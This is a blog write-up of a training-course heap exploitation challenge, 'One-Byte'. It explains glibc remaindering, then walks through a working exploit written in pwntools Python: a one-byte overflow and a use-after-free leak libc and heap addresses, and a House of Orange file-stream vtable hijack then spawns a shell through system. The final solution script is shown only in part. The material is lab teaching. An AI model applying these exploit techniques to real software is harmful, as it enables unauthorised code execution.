
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Remaindering Remaindering refers to the process of splitting one free chunk down into two. This process involves the following steps: Unlink the chunk to be split and split it in order to satisfy the requested size The part of the split chunk satisfying the request is allocated The remaining part …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Heap Journey - One-Byte"/>
  <meta property="og:description" content="Remaindering Remaindering refers to the process of splitting one free chunk down into two. This process involves the following steps: Unlink the chunk to be split and split it in order to satisfy the requested size The part of the split chunk satisfying the request is allocated The remaining part …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/binary-exploitation/heap-journey/one-byte.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2023-11-26 18:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Heap Journey - One-Byte</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/heap-journey/one-byte">Heap Journey - One-Byte</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#remaindering" title="Remaindering">Remaindering</a></li><li><a class="toc-href" href="#one-byte-challenge" title="One-byte Challenge">One-byte Challenge</a><ul><li><a class="toc-href" href="#command-execution-house-of-orange" title="Command Execution: House of Orange">Command Execution: House of Orange</a></li></ul></li></ul></div>
        </div>
    <h2 id="remaindering">Remaindering</h2>
<p>Remaindering refers to the process of splitting one free chunk down into two. This process involves the following steps:</p>
<ol>
<li>Unlink the chunk to be split and split it in order to satisfy the requested size</li>
<li>The part of the split chunk satisfying the request is allocated</li>
<li>The remaining part, called <strong>remainder</strong>, is linked to the correct free list</li>
</ol>
<p><strong>Remaindering</strong> can occur when malloc is performing different actions:</p>
<ul>
<li>During allocations from large bins</li>
<li>During <strong>binmap</strong> search</li>
<li>During unsorted bin search for a request chunk size falling into smallbins sizes range</li>
</ul>
<p>A <strong>binmap search</strong> is performed just before the top chunk allocation is used; it occurs after an unsuccessful unsortedbin or largebin search, i.e. when no suitable free chunks is found in those free list to satisfy the requested size for allocation.</p>
<p>The binmap is a bitmap (bit vector) representing which of an arena's bins <strong>may be</strong> occupied.
- Since it's a <em>lazy bitmap</em>, i.e. the bits are only updated when an operation requires knowledge of the state of bins.</p>
<p>The binmap resides towards the tail end of an arena:</p>
<p><img alt="arena-memory-mappings" src="/images/binary-exploitation/heap-journey/fastbin-dup/arena-memory.png" title="Arena Memory Mappings"/></p>
<p>Malloc uses the binmap search to quickly find the next largest occupied bin with respect to the requested chunk size. If it's found, it remainders the last chunk in that bin.</p>
<p>When a chunk isn't large enough to be remaindered so that one part satisfies the request and the remaining has at least a minimum size, it gets <strong>exhausted</strong>: the whole chunk is allocated*.</p>
<p>*Note: when this happens, the allocated chunks size could not be the exact requested size</p>
<p>If a chunk in the unsortedbin is remaindered during the binmap search and the request chunk size is within the smallbin range, the arena <strong>last_remainder</strong> field is set (see image above).</p>
<p>The <strong>last_remainder</strong> field is a pointer to the last remaindered chunk; during an unsortedbin search for a small chunk, if the search gets to the last chunk in the unsorted bin and that chunks is also the last_remainder, this chunks is remaindered again and the last_remainder pointer updated.</p>
<h2 id="one-byte-challenge">One-byte Challenge</h2>
<p>A useful tool that allows to understand what a program does at runtime is <strong>ltrace</strong>; it tracks runtime library calls in dynamically linked programs.</p>
<blockquote>
<p>ltrace -e \<filter> \<program></program></filter></p>
</blockquote>
<p>From Udemy course "Linux Heap Exploitation - Part 1", the binary <em>one_byte</em> is vulnerable to a one-bye overflow.</p>
<p>Differently from other binaries from the same course, this does not leak any libc address.</p>
<blockquote>
<p>==========| &nbsp;&nbsp;HeapLAB &nbsp;&nbsp;| &nbsp;CHALLENGE: One-Byte ======== <br/>
<br/>
1) malloc 0/16  <br/>
1) free  <br/>
2) edit  <br/>
3) read  <br/>
4) quit    </p>
</blockquote>
<p>The first goal is to leak somehow the libc @ in order to obtain the possibility to use the <em>system</em> function.</p>
<p>The malloc function allocates only chunks of size 0x60. By allocating 2 chunks <strong>A</strong> and <strong>B</strong>, and editing the first one, is possible to perform a one-byte overflow by allocating more data than expected (0x58)</p>
<blockquote>
<p>&gt; 1<br/>
&gt; 1<br/>
&gt; 3<br/>
&gt; index: 0<br/>
&gt; data: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXA  </p>
</blockquote>
<p>Analyzing the heap, the last char ("A" = 0x41) is overflowed into the next chunk, overriding its size field.</p>
<p><img alt="one-byte-overflow-1.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/one-byte-overflow-1.png"/></p>
<p>Setting an inconsistent size would corrupt the heap, as confirmed by the <em>vis</em> command:</p>
<p><img alt="one-byte-overflow-2.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/one-byte-overflow-2.png"/></p>
<p>Moreover, if chunk <strong>B</strong> is to be freed, malloc will throw an error:
- free(): invalid next size (fast)</p>
<p>This problem can be avoided using multiple of 0x60 as the overflowed chunk size value.</p>
<p>In order to leak the libc @, the remaindering process will be abused, taking advantage of the one-byte overflow.</p>
<p>To do this, 4 chunks are allocated (<strong>A</strong>,<strong>B</strong>,<strong>C</strong>,<strong>D</strong>). </p>
<ul>
<li>Chunk <strong>A</strong> is used as vector for the one-byte overflow into chunk <strong>B</strong>, overriding its size field with the value 0xc1 (0x60 * 2 + 1)</li>
<li>The program will store a pointer to chunk <strong>C</strong> but, after the overflow, it would be considered as part of <strong>B</strong> data by the allocator</li>
<li>Chunk <strong>D</strong> is needed to avoid top chunk consolidation when freeing chunk <strong>B</strong> </li>
</ul>
<p><code>A = malloc() # A -&gt; [0]</code><br/>
<code>B = malloc() # B -&gt; [1]</code><br/>
<code>C = malloc() # C -&gt; [2]</code><br/>
<code>D = malloc() # D -&gt; [3] -&gt; Needed to avoid top chunk consolidation when the fake chunk BC is freed</code> </p>
<p><code>edit(A, b"X" * 0x58 + p8(0xc1))</code></p>
<p>Being now chunk <strong>B</strong> of size 0xc1, when freed, it will be linked to the unsortedbin.
Requesting a new chunk allocation (of size 0x60 - falling into smallbin sizes range) will trigger the remaindering process:</p>
<ul>
<li>Chunk <strong>B</strong> will be split and its first part (the original chunk <strong>B</strong>) will be allocated. The second part (the original chunk <strong>C</strong>) will be linked to the unsortedbin.</li>
</ul>
<p><code>free(B) # Puts the BC fake chunk into the unsortedbin</code><br/>
<code>B = malloc()</code> </p>
<p><img alt="remaindering-1.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/remaindering-1.png"/></p>
<p>In the image above, the blue rectangle indicates the original <strong>B</strong> chunk, now re-allocated, whilst the red rectangle indicates chunk <strong>C</strong>, now freed and linked to the unsortedbin.</p>
<p>Being the chunk <strong>C</strong> free, in its fw_pointer field will contain the unsortedbin address; since the program still holds a pointer to chunk <strong>C</strong>, the <em>read</em> function can be used to leak chunk <strong>C</strong> content i.e, the unsortedbin address. Basically, this is a <strong>use-after-free vulnerability</strong>.</p>
<p><img alt="remaindering-2.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/remaindering-2.png"/></p>
<p><code>raw_leaked = read(b"2").strip()[0:8]</code><br/>
<code>leaked = u64(raw_leaked) # Leaking unsortedbin address</code> </p>
<p>Having the unsortedbin address, it's possible to leak the libc base address in various ways:</p>
<ul>
<li>Measure the offset of a libc symbol from the leaked address, such as the puts function; then, libc @ = (leaked address - measured offset) - puts symbol offset from symbols table</li>
<li>According to memory layout, the unsortedbin is placed 0x58 bytes from the main_arena start address; then, libc@ = leaked address - (main_arena address from symbols table + 0x58)</li>
</ul>
<p><code>leaked_from_puts_offset = 0x3325d8 # Manually measured: unsortedbin address - puts address</code> </p>
<p><code>puts_address = leaked - leaked_from_puts_offset</code><br/>
<code>libc_base_addr = puts_address - libc.sym.puts</code></p>
<p>OR</p>
<p><code>libc_base_addr = leaked - (libc.sym.main_arena + 0x58)</code> </p>
<p>The leaked address can be confirmed running the <em>info proc map</em> gdb command:</p>
<p><img alt="llbc-address-leak.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/llbc-address-leak.png"/></p>
<h3 id="command-execution-house-of-orange">Command Execution: House of Orange</h3>
<p>The <em>House of Orange</em> attack will be performed to achieve command execution; a fake file stream will be forged and the GLIBC file stream flushing procedures will be abused combining a vtable hijacking attack with an unsorted bin attack.</p>
<p>The first step is to leak the heap base address; this can be done abusing again the remaindering process by leaking the A chunk address.</p>
<p>Before proceeding, the remaindered chunk overlapping the C chunk is allocated.</p>
<p><code>C = malloc()</code></p>
<p>Next, chunk A and chunk C are freed; these will be placed into the 0x60 fastbin. Since fastbins are processed with LIFO policy, C will be placed on the head of the bin and will hold a pointer (in its fd_pointer field) to the next element into the single linked list, the A chunk address.</p>
<p><img alt="heap-address-leak-1.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/heap-address-leak-1.png"/></p>
<p><img alt="heap-address-leak-2.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/heap-address-leak-2.png"/></p>
<p>Using the Use-after-free vulnerability, it's possible to leak the A address i.e the heap base address.</p>
<p><code>raw_leaked = read(b"2").strip()[0:8]</code><br/>
<code>leaked = u64(raw_leaked) # Leaking heap base chunk address</code> <br/>
<code>heap_base_address = leaked # Being A the first chunk, its address is the base of the heap</code> </p>
<p>Next step is to forge a fake file stream and perform the unsortedbin attack to override the <strong>_IO_list_all</strong> pointer.</p>
<p>The heap is returned to its initial state; chunk C and A are re-allocated. Moreover, a new E chunk is allocated.</p>
<p><code>C = malloc() # C -&gt; [7]</code><br/>
<code>A = malloc() # A -&gt; [8]</code><br/>
<code>E = malloc() # E -&gt; [9]</code> </p>
<p>This additional chunk is needed since a file stream has a size of 0xe0 (224) bytes. </p>
<ul>
<li>To forge a fake file stream at least 3 0x60 (96) bytes sized chunks are needed </li>
</ul>
<blockquote>
<p>gef &gt; print sizeof(struct _IO_FILE_plus)<br/>
gef &gt; $1 = 0xe0</p>
</blockquote>
<p>The fake file stream will overlap the C, D and E chunks. It's forged as follows:</p>
<div class="highlight"><pre><span></span><code><span class="nx">fd_pointer</span><span class="p">=</span><span class="mh">0xdeadbeef</span>
<span class="nx">bk_pointer</span><span class="p">=</span><span class="nx">io_list_all_pointer</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x10</span>

<span class="nx">command</span><span class="p">=</span><span class="w"> </span><span class="nx">b</span><span class="s">"/bin/sh\0"</span>
<span class="nx">size</span><span class="p">=</span><span class="mh">0xc1</span>

<span class="err">##</span><span class="w"> </span><span class="nx">Perform</span><span class="w"> </span><span class="nx">again</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">remaindering</span><span class="w"> </span><span class="nx">so</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">put</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">unsortedbin</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">weaponized</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">unsortedbin</span><span class="w"> </span><span class="nx">attack</span>
<span class="nx">edit</span><span class="p">(</span><span class="nx">A</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="s">"X"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x58</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">size</span><span class="p">))</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">One</span><span class="o">-</span><span class="nx">byte</span><span class="w"> </span><span class="nx">overflow</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="nx">B</span>
<span class="nx">free</span><span class="p">(</span><span class="nx">B</span><span class="p">)</span><span class="w"> </span>
<span class="nx">B</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">malloc</span><span class="p">()</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">B</span><span class="w"> </span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">Remainder</span><span class="w"> </span><span class="nx">BC</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="nx">again</span>

<span class="err">##</span><span class="w"> </span><span class="nx">Forge</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">stream</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">perform</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">vtable</span><span class="w"> </span><span class="nx">hijacking</span><span class="w"> </span><span class="nx">attack</span>
<span class="nx">write_base</span><span class="p">=</span><span class="mi">1</span>
<span class="nx">write_ptr</span><span class="p">=</span><span class="mi">2</span>
<span class="nx">mode</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0xffffffff</span>
<span class="nx">junk1_size</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x7</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x8</span>
<span class="nx">junk2_size</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0xa</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x8</span>
<span class="nx">padding</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>


<span class="nx">system_address_from_heap_base_offset</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x190</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Distance</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">placed</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">stream</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">heap</span><span class="w"> </span><span class="kd">base</span>

<span class="err">##</span><span class="w"> </span><span class="nx">locate</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">vtable</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">position</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">heap</span><span class="w"> </span><span class="nx">so</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">__overflow</span><span class="w"> </span><span class="nx">overlaps</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">address</span>
<span class="nx">vtable_ptr</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">heap_base_address</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">system_address_from_heap_base_offset</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="mh">0x8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span>

<span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">"vtable pointer: 0x{vtable_ptr:02x}"</span><span class="p">)</span>

<span class="err">##</span><span class="w"> </span><span class="nx">When</span><span class="w"> </span><span class="nx">performing</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">flushing</span><span class="p">,</span><span class="w"> </span><span class="nx">GLIBC</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">follow</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">_chain</span><span class="p">:</span><span class="w"> </span><span class="nx">write</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">smallbin</span><span class="w"> </span><span class="nx">abusing</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">sorting</span><span class="w"> </span><span class="nx">process</span>
<span class="nx">edit</span><span class="p">(</span><span class="nx">B</span><span class="p">,</span>
<span class="w">     </span><span class="nx">b</span><span class="s">"B"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mh">0x58</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">len</span><span class="p">(</span><span class="nx">command</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="mh">0x69</span><span class="p">)</span>
<span class="p">)</span>

<span class="err">##</span><span class="w"> </span><span class="nx">Perform</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">unsortedbin</span><span class="w"> </span><span class="nx">attack</span>
<span class="nx">print</span><span class="p">(</span><span class="s">"Unsortedbin attack!"</span><span class="p">)</span>
<span class="nx">edit</span><span class="p">(</span><span class="nx">C</span><span class="p">,</span>
<span class="w">     </span><span class="nx">p64</span><span class="p">(</span><span class="nx">fd_pointer</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">bk_pointer</span><span class="p">)</span><span class="w"> </span><span class="o">+</span>
<span class="w">     </span><span class="nx">p64</span><span class="p">(</span><span class="nx">write_base</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">write_ptr</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span>
<span class="w">     </span><span class="nx">b</span><span class="s">"Y"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">junk1_size</span><span class="w"> </span>
<span class="p">)</span>

<span class="nx">edit</span><span class="p">(</span><span class="nx">D</span><span class="p">,</span>
<span class="w">     </span><span class="nx">b</span><span class="s">"Z"</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">junk2_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p32</span><span class="p">(</span><span class="nx">mode</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="w">    </span><span class="p">)</span>

<span class="nx">edit</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span>
<span class="w">     </span><span class="nx">p64</span><span class="p">(</span><span class="nx">libc</span><span class="p">.</span><span class="nx">sym</span><span class="p">.</span><span class="nx">system</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">vtable_ptr</span><span class="p">)</span>
<span class="p">)</span>
</code></pre></div>
<p>After the unsortedbin attack, the _IO_list_all will overlap the main arena: its file._chain attribute will overlap the 0x60 smallbin bk_pointer placed at the position <em>main_arena + 176</em>.
<img alt="file-stream-4.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/file-stream-4.png"/></p>
<p><img alt="file-stream-5.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/file-stream-5.png"/>
To make the House of Orange complete, it's necessary to manipulate the address at that position so that it's overridden with the C chunk address; when performing the flushing procedures, GLIBC will follow the _chain, flush the forged fake file stream and execute the _overflow function in the hijacked vtable, running the system() function.</p>
<p>To achieve this, the sorting process having place during unsortedbin chunks  allocation it's abused; by using the one-byte overflow, the C chunk size field is set to 0x69. </p>
<ul>
<li>When a new chunk is requested, the C chunk gets sorted into the 0x60 fastbin i.e its address is written to the bk_pointer of the 0x60 fastbin, overlapping the _chain.</li>
</ul>
<p><img alt="file-stream-2.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/file-stream-2.png"/></p>
<p><img alt="file-stream-3.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/file-stream-3.png"/></p>
<p>The program will abort due heap corruption, and, before exiting, the flushing procedure will be triggered; GLIBC will follow the chain of the file streams starting from _IO_list_all.
When flushing the forged fake file stream, the system() function is executed since the _overflow in its vtable, executed by the _IO_cleanup function, is a pointer to the libc function.</p>
<p><img alt="file-stream-vtable.png" src="https://ojack69.github.io/jacks-corner/images/binary-exploitation/heap-journey/one-byte/file-stream-vtable.png"/></p>
<p>The complete solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./one_byte"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.23/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./one_byte"</span><span class="p">)</span>
<span class="c1">#p = process("./one_byte")</span>

<span class="n">p</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>
<span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">malloc</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">counter</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">counter</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">)</span>
    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index: "</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"4"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">output</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Chunks"</span><span class="p">)</span>
<span class="n">A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># A -&gt; [0]</span>
<span class="n">B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># B -&gt; [1]</span>
<span class="n">C</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># C -&gt; [2]</span>
<span class="n">D</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># D -&gt; [3] -&gt; Needed to avoid top chunk consolidation when the fake chunk BC is freed</span>

